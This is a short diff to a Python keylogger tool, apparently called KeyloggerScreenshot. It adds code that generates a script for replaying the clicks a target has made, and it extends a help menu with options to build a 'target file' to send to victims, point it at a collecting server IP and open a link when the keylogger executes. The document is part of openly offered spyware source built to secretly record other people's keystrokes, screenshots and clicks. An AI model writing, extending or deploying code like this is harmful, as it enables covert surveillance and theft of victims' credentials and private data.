@@ -90,6 +90,19 @@ try:
                     simulation = "simulater=True"
                     boolean = True
 
+                    filename = "Simulation_code.py"
+
+                    if filename not in os.listdir():
+                        os.chdir("KeyloggerScreenshot")
+                        with open(filename, "r+") as file:
+                            data = [each for each in file]
+                            data += "\n\nstart_simulation()"
+                        os.chdir("..")
+                        with open(filename, "a+") as this_file:
+                            for line in data:
+                                this_file.write(line)
+                        print(f"{filename} HAS BEEN CREATED SO YOU CAN SIMULATE WHERE THE TARGET HAS CLICKED")
+
                 except IndexError:
                     quit()
             else:
@@ -256,7 +269,7 @@ threading_server4.start() '''
     if "-help" in lst:
         print(gui)
         print(
-            "\n-aip INSERT THE SERVERS IP\n-s   SPECIFY YOUR SECONDS (DEFAULT 60 SECONDS)\n-cf  CREATES TARGET FILE WHICH YOU SEND TO ANY TARGET\n-p   SAVES ALL THE PORTS OF THE CURRENT SERVER\n-ds  CREATES A SERVER WITH THE SAME PORTS AS THE TARGET\n-sim ACTIVATES SIMULATION\n-phs OPENS A LINK WHEN THE KEYLOGGER IS EXECUTED")
+            "\n-aip INSERT THE SERVERS IP\n-s   SPECIFY YOUR SECONDS (DEFAULT 60 SECONDS)\n-cf  CREATES TARGET FILE WHICH YOU SEND TO ANY TARGET\n-p   SAVES ALL THE PORTS OF THE CURRENT SERVER\n-ds  CREATES A SERVER WITH THE SAME PORTS AS THE TARGET\n-sim ACTIVATES SIMULATION\n-phs OPENS A LINK WHEN THE KEYLOGGER IS EXECUTED\n\n\nIF 'Simulation_code.py' IS IN YOUR DIRECTORY YOU CAN SIMULATE THE CLICKS THE TARGET HAS MADE IF IT HASN'T WORKD ON THE ACTUAL CODE")
 
 except OSError:
     print('CHECK YOUR IP-ADDRESS WITH "ipconfig" ON WINDOWS AND "ifconfig" ON LINUX')
